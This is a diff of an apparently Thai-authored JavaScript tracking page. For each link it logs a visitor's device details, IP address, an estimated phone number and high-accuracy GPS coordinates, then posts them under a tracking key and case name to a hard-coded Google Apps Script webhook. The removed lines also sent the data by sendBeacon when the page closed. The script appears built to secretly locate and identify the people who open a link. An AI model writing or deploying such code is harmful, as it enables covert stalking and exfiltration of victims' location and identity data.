@@ -59,142 +59,112 @@ function getUrlParameters() {
   const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
   const connection = getConnectionInfo();
   const browser = detectBrowser();
-  
-  // เก็บข้อมูลแหล่งที่มา (source)
-  const urlParams = new URLSearchParams(window.location.search);
-  const source = urlParams.get('source') || "link"; // ค่าเริ่มต้นคือ "link"
 
   console.log("Device Info:", deviceInfo);
   console.log("Connection Info:", connection);
   console.log("Browser Info:", browser);
-  console.log("Source:", source);
-
-  // สร้าง object ข้อมูลเริ่มต้นที่จะส่งไป
-  let dataToSend = {
-    trackingKey: trackingKey,
-    caseName: caseName,
-    timestamp: timestamp,
-    deviceInfo: {
-      ...deviceInfo,
-      screenSize: screenSize,
-      colorDepth: screenColorDepth,
-      pixelRatio: devicePixelRatio,
-      language: language,
-      browser: browser,
-      connection: connection
-    },
-    referrer: referrer,
-    source: source,
-    requestId: generateUniqueId()
-  };
-
-  // บันทึกข้อมูลลง localStorage ก่อนเพื่อป้องกันข้อมูลสูญหาย
-  storeDataInLocalStorage('pending_data', dataToSend);
 
   // ตรวจสอบการใช้งานแบตเตอรี่
   getBatteryInfo().then(batteryData => {
     console.log("Battery Info:", batteryData);
-    dataToSend.deviceInfo.battery = batteryData;
-    storeDataInLocalStorage('pending_data', dataToSend);
-  }).catch(error => {
-    console.log("Battery API not supported or error:", error);
-  });
+    // รวบรวมข้อมูลทั้งหมด
+    const allDeviceData = {
+      ...deviceInfo,
+      screenSize,
+      screenColorDepth,
+      devicePixelRatio,
+      language,
+      platform, // ใช้ platform ที่ได้จาก deviceInfo
+      browser,
+      connection,
+      battery: batteryData
+    };
 
-  // ดึงข้อมูล IP (ถ้าเป็นไปได้)
-  getIPDetails().then(ipData => {
-    console.log("IP Details:", ipData);
-    dataToSend.ip = ipData;
-    storeDataInLocalStorage('pending_data', dataToSend);
-  }).catch(error => {
-    console.log("Could not get IP info:", error);
-    dataToSend.ip = { ip: "ไม่สามารถระบุได้" };
-  });
+    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
+    let dataToSend = {};
 
-  // สร้าง function สำหรับขอสิทธิ์ geolocation
-  function requestGeolocation() {
-    if ("geolocation" in navigator) {
-      console.log("Requesting geolocation permission...");
-      
-      const positionOptions = {
-        enableHighAccuracy: true, // ใช้ GPS ความแม่นยำสูงถ้ามี
-        timeout: 10000,           // timeout หลังจาก 10 วินาที
-        maximumAge: 0             // ไม่ใช้ตำแหน่งที่แคชไว้
+    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
+    Promise.all([
+      getIPDetails().catch(error => {
+          console.error("Error getting IP details:", error);
+          return {ip: "ไม่สามารถระบุได้"};
+      }),
+      estimatePhoneNumber().catch(error => {
+          console.error("Error estimating phone number:", error);
+          return null;
+      })
+    ])
+    .then(([ipData, phoneInfo]) => {
+      console.log("IP Info:", ipData);
+      console.log("Phone Info:", phoneInfo);
+
+      // สร้าง requestId ที่นี่ ก่อนการขอตำแหน่ง
+      const requestId = generateUniqueId(); // *** สร้าง ID ที่นี่ ***
+      console.log("Generated Request ID:", requestId); // *** เพิ่ม Log ***
+
+      // เก็บข้อมูลที่จำเป็นทั้งหมด
+      dataToSend = {
+        timestamp: timestamp,
+        ip: ipData,
+        deviceInfo: allDeviceData,
+        phoneInfo: phoneInfo,
+        referrer: referrer,
+        trackingKey: trackingKey, // ใช้ค่าที่ดึงมา
+        caseName: caseName,     // ใช้ค่าที่ดึงมา
+        useServerMessage: true, // ให้ Server สร้างข้อความแจ้งเตือน
+        requestId: requestId    // ใช้ ID ที่สร้างไว้
       };
-      
-      navigator.geolocation.getCurrentPosition(
-        // Success callback
-        function(position) {
-          console.log("Geolocation permission granted!");
-          const locationData = {
-            lat: position.coords.latitude,
-            long: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: position.timestamp,
-            gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-          };
-          
-          console.log("Location data:", locationData);
-          dataToSend.location = locationData;
-          
-          // บันทึกข้อมูลลง localStorage เมื่อได้ Location แล้ว
-          storeDataInLocalStorage('pending_data', dataToSend);
-          
-          // ส่งข้อมูลไปยังเซิร์ฟเวอร์ทันทีหลังจากได้ตำแหน่ง
-          sendToLineNotify(dataToSend);
-        },
-        // Error callback
-        function(error) {
-          console.warn(`Geolocation error (${error.code}): ${error.message}`);
-          dataToSend.location = "ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง";
-          
-          // บันทึกข้อมูลลง localStorage แม้จะไม่ได้รับอนุญาต Location
-          storeDataInLocalStorage('pending_data', dataToSend);
-          
-          // ส่งข้อมูลที่มีอยู่แม้จะไม่มี location
-          sendToLineNotify(dataToSend);
-        },
-        positionOptions
-      );
-    } else {
-      console.log("Geolocation not supported by this browser");
-      dataToSend.location = "เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง";
-      
-      // บันทึกข้อมูลลง localStorage
-      storeDataInLocalStorage('pending_data', dataToSend);
-      
-      // ส่งข้อมูลที่มีอยู่แม้จะไม่มี geolocation
-      sendToLineNotify(dataToSend);
-    }
-  }
 
-  // ประมาณการข้อมูลโทรศัพท์ (ถ้ามี)
-  estimatePhoneNumber().then(phoneInfo => {
-    console.log("Phone info estimation:", phoneInfo);
-    dataToSend.phoneInfo = phoneInfo;
-    storeDataInLocalStorage('pending_data', dataToSend);
-    
-    // เมื่อรวบรวมข้อมูลทั้งหมดที่ไม่ต้องขออนุญาตแล้ว จึงขออนุญาต geolocation
-    requestGeolocation();
-  }).catch(error => {
-    console.log("Could not estimate phone info:", error);
-    // ขอ geolocation แม้จะไม่มีข้อมูลโทรศัพท์
-    requestGeolocation();
-  });
+      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 15 วินาที
+      if (navigator.geolocation) {
+        console.log("Requesting geolocation...");
+        const locationPromise = new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              console.log("Geolocation success:", position.coords);
+              resolve({
+                lat: position.coords.latitude,
+                long: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
+              });
+            },
+            error => {
+              console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
+              resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
+            },
+            {
+              timeout: 15000, // 15 วินาที
+              enableHighAccuracy: true,
+              maximumAge: 0
+            }
+          );
+        });
 
-  // ลงทะเบียน event listener สำหรับ beforeunload เพื่อจัดการกรณีผู้ใช้ปิดเว็บ
-  window.addEventListener('beforeunload', function() {
-    // ใช้ Navigator.sendBeacon() เพื่อส่งข้อมูลแม้ว่าเว็บจะถูกปิด
-    const currentData = getDataFromLocalStorage('pending_data');
-    if (currentData) {
-      // ระบุว่าการส่งนี้มาจากผู้ใช้ปิดเว็บ
-      currentData.exitType = 'browser_close';
-      
-      const blob = new Blob([JSON.stringify(currentData)], { type: 'application/json' });
-      
-      // ใช้ sendBeacon เพื่อให้ส่งข้อมูลได้แม้จะปิดเว็บ
-      navigator.sendBeacon('https://script.google.com/macros/s/AKfycbyxX0-vdz7prnK1-jgF5HAgtB3VUh6qgyAkwPbOXvBDIZclrmn2rRb4QXRkCAqtuKh-/exec', blob);
-      console.log("Sent final data using sendBeacon before page unload");
-    }
+        // รอข้อมูลพิกัดไม่เกิน 15 วินาที
+        Promise.race([
+          locationPromise,
+          new Promise(resolve => setTimeout(() => {
+            console.warn("Geolocation request timed out after 15 seconds.");
+            resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อหมดเวลา
+          }, 15000))
+        ])
+        .then(location => {
+          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
+          dataToSend.location = location;
+          console.log("Final data to send (with location):", JSON.stringify(dataToSend));
+
+          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
+          sendToLineNotify(dataToSend);
+        });
+      } else {
+        // ถ้าไม่สามารถใช้ Geolocation API ได้
+        console.warn("Geolocation API is not supported in this browser.");
+        dataToSend.location = "ไม่มีข้อมูล";
+        console.log("Final data to send (no geolocation support):", JSON.stringify(dataToSend));
+        sendToLineNotify(dataToSend);
+      }
+    });
   });
 })();
 
@@ -206,28 +176,6 @@ function generateUniqueId() {
   return `req-${timestamp}-${randomPart}`;
 }
 
-// ฟังก์ชันใหม่: บันทึกข้อมูลลง localStorage
-function storeDataInLocalStorage(key, data) {
-  try {
-    localStorage.setItem(key, JSON.stringify(data));
-    console.log("Data stored in localStorage:", key);
-    return true;
-  } catch (error) {
-    console.error("Error storing data in localStorage:", error);
-    return false;
-  }
-}
-
-// ฟังก์ชันใหม่: ดึงข้อมูลจาก localStorage
-function getDataFromLocalStorage(key) {
-  try {
-    const data = localStorage.getItem(key);
-    return data ? JSON.parse(data) : null;
-  } catch (error) {
-    console.error("Error getting data from localStorage:", error);
-    return null;
-  }
-}
 
 // ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
 function getDetailedDeviceInfo() {
@@ -612,7 +560,7 @@ async function getIPDetails() {
         console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
         const responseNoToken = await fetch('https://ipinfo.io/json');
         if (!responseNoToken.ok) {
-            throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
+             throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
         }
         return await responseNoToken.json();
     }
@@ -651,8 +599,8 @@ async function getIPDetails() {
             const finalFbData = await finalFallbackResponse.json();
             return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
         } catch (finalFallbackError) {
-            console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
-            return { ip: "ไม่สามารถระบุได้" };
+             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
+             return { ip: "ไม่สามารถระบุได้" };
         }
     }
   }
@@ -720,55 +668,51 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyxX0-vdz7prnK1-jgF5HAgtB3VUh6qgyAkwPbOXvBDIZclrmn2rRb4QXRkCAqtuKh-/exec';
-  
-  // ตรวจสอบว่าข้อมูลมาจาก sendBeacon หรือไม่
-  const isBeaconData = dataToSend.exitType === 'browser_close';
-  
-  console.log(`Sending data to webhook ${isBeaconData ? '(via beacon)' : '(normal)'}...`);
-  
-  // เพิ่มการยืนยันว่าข้อมูล location อยู่ในรูปแบบที่ถูกต้อง
-  if (dataToSend.location && typeof dataToSend.location === 'object') {
-    // ตรวจสอบและแปลงค่า lat, long เป็นตัวเลข
-    if (dataToSend.location.lat !== undefined) {
-      dataToSend.location.lat = Number(dataToSend.location.lat);
-    }
-    if (dataToSend.location.long !== undefined) {
-      dataToSend.location.long = Number(dataToSend.location.long);
-    }
-    // ตรวจสอบและแปลงค่า accuracy เป็นตัวเลข
-    if (dataToSend.location.accuracy !== undefined) {
-      dataToSend.location.accuracy = Number(dataToSend.location.accuracy);
-    }
-    
-    console.log("Formatted location data:", dataToSend.location);
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbx_PTFnLT7AjaN9uKtZXZuLkU7itTEwBCHy-QtwGhVNL3GmT1nSYPcphWAjsXXLo-g/exec';
+
+  // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
+  if (!dataToSend.requestId) {
+    console.warn("No requestId found in dataToSend, generating a new one.");
+    dataToSend.requestId = generateUniqueId();
   }
-  
-  // ใช้ fetch API ในการส่งข้อมูล (หากไม่ใช่ sendBeacon)
-  if (!isBeaconData) {
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(dataToSend)
-    })
-    .then(response => {
-      console.log("Webhook response status:", response.status);
-      if (response.ok) {
-        console.log("Data sent successfully!");
-        // ลบข้อมูลจาก localStorage เมื่อส่งสำเร็จ
-        localStorage.removeItem('pending_data');
-      } else {
-        console.error("Failed to send data");
-      }
-      return response.text();
-    })
-    .then(text => {
-      console.log("Response body:", text);
-    })
-    .catch(error => {
-      console.error("Error sending data:", error);
-    });
+  const currentRequestId = dataToSend.requestId;
+
+  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำใน session ปัจจุบัน
+  const sentKey = `sent_${currentRequestId}`;
+  if (sessionStorage.getItem(sentKey)) {
+    console.log(`DUPLICATE (Session Storage): ข้อมูลสำหรับ requestId ${currentRequestId} เคยส่งแล้วใน session นี้`);
+    return; // ไม่ส่งซ้ำ
   }
+
+  console.log(`กำลังส่งข้อมูลไป webhook (requestId: ${currentRequestId})`);
+  console.log("Data:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง
+
+  // ส่งข้อมูลด้วย fetch API
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      // 'Content-Type': 'application/json' // GAS doPost รับ text/plain ได้ดีกว่าเมื่อ parse JSON เอง
+      'Content-Type': 'text/plain;charset=utf-8', // ส่งเป็น text/plain
+    },
+    body: JSON.stringify(dataToSend), // ส่งข้อมูลเป็น JSON string
+    mode: 'no-cors' // ยังคงใช้ no-cors เพราะ GAS ไม่ได้ตั้งค่า CORS response มาตรฐาน
+  })
+  .then(() => {
+    // เนื่องจากใช้ no-cors เราจะไม่ได้รับ response จริงๆ กลับมา
+    // เรา assume ว่าการส่งสำเร็จถ้าไม่มี network error
+    console.log(`ส่งข้อมูลไปยัง Server สำเร็จ (assumed success due to no-cors) - RequestId: ${currentRequestId}`);
+
+    // บันทึกว่า requestId นี้ถูกส่งแล้วใน session นี้
+    try {
+        sessionStorage.setItem(sentKey, 'true');
+        console.log(`บันทึก requestId ${currentRequestId} ลงใน sessionStorage`);
+    } catch (e) {
+        console.error("ไม่สามารถบันทึก requestId ลง sessionStorage:", e);
+    }
+  })
+  .catch(error => {
+    // Catch network errors หรือข้อผิดพลาดอื่นๆ ในการส่ง
+    console.error(`เกิดข้อผิดพลาดในการส่งข้อมูล (requestId: ${currentRequestId}):`, error);
+    // อาจจะลอง retry หรือแจ้งเตือนผู้ใช้/ระบบ
+  });
 }
